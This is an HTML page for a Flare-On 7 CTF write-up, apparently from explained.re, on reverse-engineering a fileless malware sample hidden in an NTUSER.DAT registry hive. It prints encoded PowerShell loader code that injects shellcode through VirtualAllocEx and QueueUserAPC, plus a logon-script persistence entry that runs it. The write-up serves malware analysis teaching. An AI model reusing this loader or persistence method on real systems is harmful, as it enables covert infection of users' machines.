@@ -1,0 +1,1324 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Flare-On 7 — 11 Rabbithole - explained.re</title><meta name="Description" content=""><meta property="og:title" content="Flare-On 7 — 11 Rabbithole" />
+<meta property="og:description" content="Challenge Description  One of our endpoints was infected with a very dangerous, yet unknown malware strain that operates in a fileless manner. The malware is - without doubt - an APT that is the ingenious work of the Cyber Army of the Republic of Kazohinia.
+One of our experts said that it looks like they took an existing banking malware family, and modified it in a way that it can be used to collect and exfiltrate files from the hard drive." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/flare-on-7-rabbithole/" />
+<meta property="og:image" content="/images/explained.svg"/>
+<meta property="article:published_time" content="2020-10-23T21:29:51+03:00" />
+<meta property="article:modified_time" content="2020-10-23T21:29:51+03:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/images/explained.svg"/>
+
+<meta name="twitter:title" content="Flare-On 7 — 11 Rabbithole"/>
+<meta name="twitter:description" content="Challenge Description  One of our endpoints was infected with a very dangerous, yet unknown malware strain that operates in a fileless manner. The malware is - without doubt - an APT that is the ingenious work of the Cyber Army of the Republic of Kazohinia.
+One of our experts said that it looks like they took an existing banking malware family, and modified it in a way that it can be used to collect and exfiltrate files from the hard drive."/>
+<meta name="application-name" content="explained.re">
+<meta name="apple-mobile-web-app-title" content="explained.re"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/posts/flare-on-7-rabbithole/" /><link rel="prev" href="/posts/flare-on-7-break/" /><link rel="next" href="/posts/flare-on-7-opening-notes/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Flare-On 7 — 11 Rabbithole",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/posts\/flare-on-7-rabbithole\/"
+        },"genre": "posts","keywords": "flare-on","wordcount":  10875 ,
+        "url": "\/posts\/flare-on-7-rabbithole\/","datePublished": "2020-10-23T21:29:51+03:00","dateModified": "2020-10-23T21:29:51+03:00","publisher": {
+            "@type": "Organization",
+            "name": "explained.re"},"author": {
+                "@type": "Person",
+                "name": "explained.re"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="explained.re"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/explained.svg"
+        data-srcset="/images/explained.svg, /images/explained.svg 1.5x, /images/explained.svg 2x"
+        data-sizes="auto"
+        alt="/images/explained.svg"
+        title="/images/explained.svg" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/explainedre/website" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="explained.re"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/explained.svg"
+        data-srcset="/images/explained.svg, /images/explained.svg 1.5x, /images/explained.svg 2x"
+        data-sizes="auto"
+        alt="/images/explained.svg"
+        title="/images/explained.svg" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/explainedre/website" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Flare-On 7 — 11 Rabbithole</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>explained.re</a></span>&nbsp;<span class="post-category">included in <a href="/categories/write-up/"><i class="far fa-folder fa-fw"></i>write-up</a>&nbsp;<a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-10-23">2020-10-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;10875 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;52 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#analyzing-the-registry-hive">Analyzing the registry hive</a>
+      <ul>
+        <li><a href="#method-1-using-the-command-line-from-linux">Method 1: Using the command line from Linux</a></li>
+        <li><a href="#method-2-registry-explorer-on-windows">Method 2: Registry Explorer on Windows</a></li>
+      </ul>
+    </li>
+    <li><a href="#analyzing-the-reg-file">Analyzing the .reg file</a></li>
+    <li><a href="#analyzing-the-powershell-script">Analyzing the Powershell script</a></li>
+    <li><a href="#analyzing-the-shellcode">Analyzing the Shellcode</a>
+      <ul>
+        <li><a href="#highlighting-dynamic-calls-in-the-decompiler">Highlighting dynamic calls in the decompiler</a></li>
+        <li><a href="#entering-the-first-stage">Entering the first stage</a></li>
+        <li><a href="#setting-up-a-debug-environment">Setting up a debug environment</a></li>
+        <li><a href="#xor-decryption-function">XOR decryption function</a></li>
+        <li><a href="#saigon-ursnif-gozi-isfb">Saigon? Ursnif? Gozi? ISFB?</a></li>
+        <li><a href="#name-generation-using-sid">Name generation using SID</a></li>
+        <li><a href="#injecting-module-to-explorerexe">Injecting module to explorer.exe</a></li>
+        <li><a href="#decrypting-all-the-modules-using-serpent-and-aplib">Decrypting all the modules using Serpent and aPLib</a></li>
+      </ul>
+    </li>
+    <li><a href="#where-is-my-flag">Where is my flag?</a></li>
+    <li><a href="#decrypting-dimap">Decrypting DiMap</a></li>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#appendix">Appendix</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>Challenge Description<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>One of our endpoints was infected with a very dangerous, yet unknown malware
+strain that operates in a fileless manner. The malware is - without doubt - an
+APT that is the ingenious work of the Cyber Army of the Republic of Kazohinia.</p>
+<p>One of our experts said that it looks like they took an existing banking
+malware family, and modified it in a way that it can be used to collect and
+exfiltrate files from the hard drive.</p>
+<p>The malware started destroying the disk, but our forensic investigators were
+able to salvage ones of the files. Your task is to find out as much as you can
+about the behavior of this malware, and try to find out what was the data that
+it tried to steal before it started wiping all evidence from the computer.</p>
+<p>Good luck!*</p>
+</div>
+        </div>
+    </div>
+<p><em>For your convenience, use the table of contents on your right to quickly navigate to different locations and skip parts that you are rather familiar with.</em></p>
+<h2 id="introduction">Introduction</h2>
+<p>Welcome to the very last challenge on Flare-On 7 and to the last post in our series of write-ups for the competition. As we are coming closer and closer to the finish line, things are getting more and more complicated. &ldquo;Rabbithole&rdquo;, the last challenge did not disappoint and involved a wide range of topics and techniques - with a real-life scenario. As in previous write-ups, we will present you with multiple ways to approach and solve the different steps in this challenge. Hopefully, we will be able to provide you with more tools and habits for challenges you will face in the future (maybe Flare-On 8?), as well as share with you how we think and approach such a challenge. Brace yourself, we are going down the rabbit hole.</p>
+<pre><code>little alice fell
+d
+  o
+    w
+      n
+   the hOle,
+         bumped her head
+         and bruised her soul
+</code></pre><p>One thing to keep in mind, and here is the first tip for today, is that whenever the challenge name or description suggests that we are facing a rabbit hole, we need to do everything we can in order to avoid it. Such challenges usually involve a lot of non-valuable code to analyze, and in this writeup, we will try to show how we can approach it while avoiding this rabbit hole.</p>
+<p>In this challenge, we are given with a single file called &ldquo;NTUSER.DAT&rdquo;. Those of you who are familiar with Windows environments will probably know that this name suggests that we are dealing with a user registry hive that contains the user profile and configurations. Let&rsquo;s verify it by executing the <code>file</code> command and detect the file type:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ file NTUSER.DAT
+NTUSER.DAT: MS Windows registry file, NT/2000 or above
+</code></pre></div><p>And indeed, our assumption is true — this file is a registry hive.</p>
+<p>Seeing this, and knowing we are facing a reverse engineering challenge, we can already have several guesses of how can a binary or code be integrated into this registry hive. Some of the guesses can be:</p>
+<ol>
+<li>One or more of the keys have binary blobs as values - <strong>probable</strong></li>
+<li>Similar to many &ldquo;file-less&rdquo; stages in malware, a script of some kind (Javascript, VBScript, Powershell, batch, &hellip;) will be written to the registry - <strong>probable</strong></li>
+<li>This is not, or partially not, a real registry hive, but a hoax - <strong>unlikely</strong></li>
+<li>We will need to go over a list of recently opened file and search for clues - <strong>unlikely</strong></li>
+<li>We will need to look for recently accessed network locations (like URLs, IPs, &hellip;) to download the challenge - <strong>unlikely</strong></li>
+</ol>
+<p>These are only some of the ideas we had on our minds, and to test our theories against the file, we need to explore it and extract valuable data out of it.</p>
+<h2 id="analyzing-the-registry-hive">Analyzing the registry hive</h2>
+<p>Thankfully, there are many ways we can analyze the registry file. Let&rsquo;s go over some of them, maybe you&rsquo;ll find a way that was similar to yours, and maybe you&rsquo;ll learn some other approaches.</p>
+<h3 id="method-1-using-the-command-line-from-linux">Method 1: Using the command line from Linux</h3>
+<p>Command-line lovers? Great! This is for you. Naturally, most Linux distributions do not contain tools to handle and parse Windows registry files, but don&rsquo;t let this stop you. The open-source community released several great projects that can assist us when we want to manipulate, view, and extract such files.</p>
+<p>The first thing we do when we face such a challenge is to start from the noisiest approach, and slowly clear our way towards a specific target that we can focus on. Hence, to start, we simply want to dump all the printable text from this <code>NTUSER.DAT</code> file. To do this, we used the <a href="https://github.com/fireeye/flare-floss" target="_blank" rel="noopener noreffer">floss</a> tool by FireEye&rsquo;s FLARE (<strong>Yes.</strong> The same FLARE that is behind Flare-On), but you can use any other <code>strings</code> utility, including the built-in one on Linux (make sure to also dump wide strings), or the utility from SysInternals. The truth is, you can even use Notepad — all we want to do is to observe and inspect the content of the file in order to spot valuable information.</p>
+<p>Let&rsquo;s run <code>floss</code> and limit the minimum length for strings to be 200 characters. Upon running, we will immediately spot a huge blob of what seems like Base64 blobs and a code of Powershell.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ floss -n <span class="m">200</span> NTUSER.DAT
+
+FLOSS static ASCII strings
+...
+...
+...
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="s2">&#34;);
+</span><span class="s2">function geapmkxsiw{</span><span class="nv">$kjurpkot</span><span class="s2">=hjmk(</span><span class="nv">$args</span><span class="s2">[0]);[System.Text.Encoding]::ASCII.GetString(</span><span class="nv">$kjurpkot</span><span class="s2">);};iex(geapmkxsiw(&#34;</span><span class="nv">DQokY3FsdGQ9Ig0KW0RsbEltcG9ydChgImtlcm5lbDMyYCIpXWBucHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRUaHJlYWRJZCgpO2BuDQpbRGxsSW1wb3J0KGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgT3BlblRocmVhZCh1aW50IG5vcGV5bGxheCx1aW50IGl0cXhsdnBjLEludFB0ciB3ZW8pO2BuDQpbRGxsSW1wb3J0KGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IFF1ZXVlVXNlckFQQyhJbnRQdHIgbHhxaSxJbnRQdHIgcWxyLEludFB0ciB0Z29td2psYSk7YG4NCltEbGxJbXBvcnQoYCJrZXJuZWwzMmAiKV1gbnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHZvaWQgU2xlZXBFeCh1aW50IHduaHRpeWd2Yyx1aW50IGlneXYpOyI7DQoNCiR0c2VsY2Z4aHdvPUFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICRjcWx0ZCAtTmFtZSAnYWx3JyAtbmFtZXNwYWNlIGVsdWVkdmUgLXBhc3N0aHJ1Ow0KDQokZHJ5am1ucHFqPSJmZmN4IjskbmF5dz0iDQpbRGxsSW1wb3J0KGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q3VycmVudFByb2Nlc3MoKTtgbg0KW0RsbEltcG9ydChgImtlcm5lbDMyYCIpXWBucHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvY0V4KEludFB0ciB3YXNtaHFmeSxJbnRQdHIgaHRkZ3FoZ3B3YWksdWludCB1eG4sdWludCBtZXBnY3BkYnBjLHVpbnQgeGRqcCk7IjsNCg0KJHl3cXBoc3J3PUFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICRuYXl3IC1OYW1lICdwcW52b2hsZ2dmJyAtbmFtZXNwYWNlIHJtYiAtcGFzc3RocnU7DQo</span><span class="o">=</span><span class="s2">&#34;));iex(geapmkxsiw(&#34;</span><span class="nv">DQoNCiRqa3k9ImVwbmMiOw0KDQoka3doaz0kdHNlbGNmeGh3bzo6T3BlblRocmVhZCgxNiwwLCR0c2VsY2Z4aHdvOjpHZXRDdXJyZW50VGhyZWFkSWQoKSk7DQppZigkeWhpYmJxdz0keXdxcGhzcnc6OlZpcnR1YWxBbGxvY0V4KCR5d3FwaHNydzo6R2V0Q3VycmVudFByb2Nlc3MoKSwwLCRycGwuTGVuZ3RoLDEyMjg4LDY0KSkNCnsNCiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRycGwsMCwkeWhpYmJxdywkcnBsLmxlbmd0aCk7DQogaWYoJHRzZWxjZnhod286OlF1ZXVlVXNlckFQQygkeWhpYmJxdywka3doaywkeWhpYmJxdykpDQogew0KICAkdHNlbGNmeGh3bzo6U2xlZXBFeCg1LDMpOw0KIH0NCn0NCn</span><span class="o">==</span><span class="s2">&#34;));
+</span><span class="s2">
+</span><span class="s2">...
+</span><span class="s2">...
+</span></code></pre></div><p>Bingo! We are on the right track. As you saw, by executing this simple command, we already have valuable information to work with. Moreover, now we can confirm that <strong>at least</strong> one of our guesses is right, a script of some kind was written to the registry — a Powershell script.</p>
+<p>Equipped with this knowledge, we can now dump the entire DAT file into a <code>.reg</code> format. This is a textual Windows Registry &ldquo;script&rdquo; format that can be used to import and export registry entries. We can use it now, thanks to the fact that we know that we are looking for textual values, like Base64, and Powershell code. In case that it was a binary blob (hex format), it would not be so useful for us. But it is textual, so we are lucky.</p>
+<p>To dump the contents, we can use <code>hivexregedit</code> from the <code>hivex</code> package for Linux. This set of utilities is very helpful for navigating, manipulating, parsing, and extracting registry files.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Use hivexregedit with the &#34;--unsafe-printable-strings&#34; to tell the utility to</span>
+<span class="c1"># export printable strings as strings and not as converted hexadecimal bytes.</span>
+$ hivexregedit --unsafe-printable-strings --export NTUSER.DAT <span class="s1">&#39;\&#39;</span> &gt; NTUSER.reg
+</code></pre></div><h3 id="method-2-registry-explorer-on-windows">Method 2: Registry Explorer on Windows</h3>
+<p>The Windows ecosystem has many tools and utilities to view and manipulate registry files. We decided to use Registry Explorer by <a href="https://ericzimmerman.github.io" target="_blank" rel="noopener noreffer">Eric Zimmerman</a>. Let&rsquo;s open &ldquo;NTUSER.DAT&rdquo; in the software and browse around.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image.png" title="/posts/flare-on-7-rabbithole/images/image.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image.png, images/image.png 1.5x, /posts/flare-on-7-rabbithole/images/image.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image.png" />
+    </a>
+<p>Having access to such a nice GUI tool, we can simply take a few minutes and navigate around the different potentially interesting keys. This will quickly bring us to <code>\SOFTWARE\Timerpro</code>.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_1.png" title="/posts/flare-on-7-rabbithole/images/image_1.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_1.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_1.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_1.png, images/image_1.png 1.5x, /posts/flare-on-7-rabbithole/images/image_1.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_1.png" />
+    </a>
+<p>Alternatively, we can search for some keywords like &ldquo;powershell&rdquo;, &ldquo;javascript&rdquo;, &ldquo;base64&rdquo; or &ldquo;function&rdquo; and quickly arrive at the relevant keys.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_2.png" title="/posts/flare-on-7-rabbithole/images/image_2.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_2.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_2.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_2.png, images/image_2.png 1.5x, /posts/flare-on-7-rabbithole/images/image_2.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_2.png" />
+    </a>
+<p>The powerful searching capabilities of Registry Explorer helps us to filter out of the noise and find the <code>D</code> key under <code>Timerpro</code>.</p>
+<p>Finally, let&rsquo;s export <code>Timerpro</code> and its subkeys to a <code>.reg</code> file.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_3.png" title="/posts/flare-on-7-rabbithole/images/image_3.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_3.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_3.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_3.png, images/image_3.png 1.5x, /posts/flare-on-7-rabbithole/images/image_3.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_3.png" />
+    </a>
+<p>We know that some people used another program called &ldquo;Registry Viewer&rdquo; and encountered issues with exporting the registry keys. It is always a good practice to test your results with different tools and verify that they are valid.</p>
+<h2 id="analyzing-the-reg-file">Analyzing the .reg file</h2>
+<p>We can now open <code>NTUSER.reg</code> and inspect it in a text editor. Searching for any substring from the output we saw earlier, will bring us to the relevant place in the file. We searched for &ldquo;AAAA&rdquo; and landed in the suspicious key.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span><span class="se">\S</span>OFTWARE<span class="se">\T</span>imerpro<span class="o">]</span>
+<span class="s2">&#34;CalTimer&#34;</span><span class="o">=</span>hex<span class="o">(</span>3<span class="o">)</span>:04,a6,7b,e9,33,5c,d6,01
+<span class="s2">&#34;CurrentByte&#34;</span><span class="o">=</span>hex<span class="o">(</span>3<span class="o">)</span>:04,a6,7b,e9,33,5c,d6,01
+<span class="s2">&#34;D&#34;</span><span class="o">=</span>str<span class="o">(</span>1<span class="o">)</span>:<span class="s2">&#34;</span><span class="nv">$jjw</span><span class="s2">=\&#34;kcsukccudy\&#34;;
+</span><span class="s2">function hjmk{[System.Convert]::FromBase64String(</span><span class="nv">$args</span><span class="s2">[0]);};
+</span><span class="s2">[byte[]]</span><span class="nv">$rpl</span><span class="s2">=hjmk(\&#34;6feZAAA0BgBuMWFe34CyvFBFtRPwADwg3yh6fwDaAAAALgAAAAAAAFg+AAAAEAAAAAAAgAEAAAAAEAAAAAAAAAQAAAAAAAAABQACAAAAAAAAUAEAAAQAAAAAAAACAAAAAAAQAAAA...
+</span><span class="s2">...
+</span><span class="s2">...
+</span></code></pre></div><p>Looking around, it seems like the entire <code>SOFTWARE\Timerpro</code> key and its sub-keys are all &ldquo;suspicious&rdquo; and look like potentially related to the challenge. Alright, so it seems like recursively dumping the keys from Timerpro is the way to go.</p>
+<p>We wrote a small Python script using <code>python-registry</code> that will dump the relevant keys. For your convenience we share it here:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+<span class="kn">from</span> <span class="nn">Registry</span> <span class="kn">import</span> <span class="n">Registry</span>
+
+<span class="k">def</span> <span class="nf">recursive_dump</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+    <span class="s2">&#34;&#34;&#34;Recursively dump keys from a given key, to a .bin file into the &#34;keys&#34; directory.
+</span><span class="s2">        keys/Timerpro/[subkey.bin]
+</span><span class="s2">        keys/Timerpro/[subkeykey]/[subkey.bin]
+</span><span class="s2">    &#34;&#34;&#34;</span>
+    <span class="c1"># Get the path of the key, remove its prefix and use forward slash</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">path</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;ROOT</span><span class="se">\\</span><span class="s1">SOFTWARE</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">)</span>
+
+    <span class="c1"># Create a Path object for the &#34;keys&#34; directory that will contain the dumped files</span>
+    <span class="n">key_path</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s2">&#34;keys&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">key_path</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">parents</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">key</span><span class="o">.</span><span class="n">values</span><span class="p">():</span>
+        <span class="c1"># Concat the name of the key to the Path</span>
+        <span class="n">file_path</span> <span class="o">=</span> <span class="p">(</span><span class="n">key_path</span> <span class="o">/</span> <span class="n">val</span><span class="o">.</span><span class="n">name</span><span class="p">())</span><span class="o">.</span><span class="n">with_suffix</span><span class="p">(</span><span class="s2">&#34;.bin&#34;</span><span class="p">)</span>
+
+        <span class="c1"># Dump the value of the key to a file</span>
+        <span class="n">file_path</span><span class="o">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="n">val</span><span class="o">.</span><span class="n">raw_data</span><span class="p">())</span>
+
+    <span class="c1"># Recursively call this function with all the subkeys</span>
+    <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">recursive_dump</span><span class="p">,</span> <span class="n">key</span><span class="o">.</span><span class="n">subkeys</span><span class="p">()))</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="c1"># Open the NTUSER.DAT file</span>
+    <span class="n">reg</span> <span class="o">=</span> <span class="n">Registry</span><span class="o">.</span><span class="n">Registry</span><span class="p">(</span><span class="s2">&#34;NTUSER.DAT&#34;</span><span class="p">)</span>
+
+    <span class="c1"># Get the Timerpro key</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">reg</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;SOFTWARE</span><span class="se">\\</span><span class="s2">Timerpro&#34;</span><span class="p">)</span>
+    <span class="n">recursive_dump</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ exa -T keys/
+keys/
+└── Timerpro
+   ├── CalTimer.bin
+   ├── CurrentByte.bin
+   ├── D.bin
+   ├── DatNew.bin
+   ├── DayOld.bin
+   ├── DiMap.bin
+   ├── FalseLanguage.bin
+   ├── ScaleThr.bin
+   ├── ScreenWeb.bin
+   ├── SoftwareColumn.bin
+   ├── SolutionDat.bin
+   ├── ThemeDay.bin
+   ├── TimerVersion.bin
+   ├── VersiScreen.bin
+   ├── WebFalse.bin
+   ├── Columncurrent
+   │  ├── CaclibRegionmap.bin
+   │  ├── CalccalcLogicnew.bin
+   │  ├── CalciconLogicthre.bin
+   │  ├── DatethrWorkscreen.bin
+   │  ├── DiskproIdbui.bin
+   │  ├── InflibExplorertru.bin
+   │  ├── PrintsolutSavetheme.bin
+   │  ├── ProtocolmagicWordeskt.bin
+   │  ├── RowmapGuiprotocol.bin
+   │  ├── ScreenserProtocolacces.bin
+   │  ├── SoflogicMagiclink.bin
+   │  ├── TasknetCharconso.bin
+   │  ├── ThemespellDaytheme.bin
+   │  ├── TimermagSelink.bin
+   │  ├── WebmodeThemearchive.bin
+   │  ├── WebsoftwareProcesstemplate.bin
+   │  └── WordlibSystemser.bin
+   ├── Languagetheme
+   │  ├── CaclibRegionmap.bin
+   │  ├── CalccalcLogicnew.bin
+   │  ├── DatethrWorkscreen.bin
+   │  ├── InfspellTimerver.bin
+   │  ├── KeyboardtimerWolib.bin
+   │  ├── MonitornewWarningmap.bin
+   │  ├── NewinRegionsea.bin
+   │  ├── PrintsolutSavetheme.bin
+   │  ├── ProcesscharProtocomedia.bin
+   │  ├── ProtocolmagicWordeskt.bin
+   │  ├── RowmapGuiprotocol.bin
+   │  ├── ScreenserProtocolacces.bin
+   │  ├── SoflogicMagiclink.bin
+   │  ├── ThemespellDaytheme.bin
+   │  ├── ThemewebInnet.bin
+   │  ├── TimerscreenClientsecur.bin
+   │  ├── WebmodeThemearchive.bin
+   │  ├── WebsoftwareProcesstemplate.bin
+   │  └── WordlibSystemser.bin
+   └── WordTimer
+      └── MAIN.bin
+</code></pre></div><h2 id="analyzing-the-powershell-script">Analyzing the Powershell script</h2>
+<p>From the quick look we took on the dumped files, it seems like <code>D.bin</code> is the most interesting and actionable one as it contains the Powershell code we dumped from <code>Timerpro/D</code>. This Powershell code is executed by a logon script in <code>SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon\0\0</code> as can be seen in the following snippet from NTUSER.reg:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span><span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\G</span>roup Policy<span class="se">\S</span>cripts<span class="se">\L</span>ogon<span class="se">\0\0</span><span class="o">]</span>
+<span class="s2">&#34;ExecTime&#34;</span><span class="o">=</span>hex<span class="o">(</span>b<span class="o">)</span>:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+<span class="s2">&#34;IsPowershell&#34;</span><span class="o">=</span>dword:00000000
+<span class="s2">&#34;Parameters&#34;</span><span class="o">=</span>str<span class="o">(</span>1<span class="o">)</span>:<span class="s2">&#34;/p C:\WINDOWS\system32 /s /c \&#34;cmd /c @file -ec aQBlAHgAIAAoAGcAcAAgACcASABLAEMAVQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAVABpAG0AZQByAHAAcgBvACcAKQAuAEQA\&#34; /m p*ll.*e&#34;</span>
